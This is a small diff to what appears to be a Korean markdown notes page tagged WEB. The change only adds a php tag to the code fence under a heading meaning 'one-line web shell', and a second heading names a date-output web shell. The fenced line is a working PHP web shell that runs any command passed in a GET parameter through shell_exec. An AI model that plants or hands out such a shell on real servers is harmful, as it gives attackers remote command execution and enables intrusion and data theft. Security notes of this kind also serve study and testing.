@@ -10,6 +10,7 @@ tags: [WEB]
 
 ### 한줄 웹쉘
 
-```<?php echo shell_exec($_GET['cmd']); ?>
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
 
 ### 날짜 출력 웹쉘
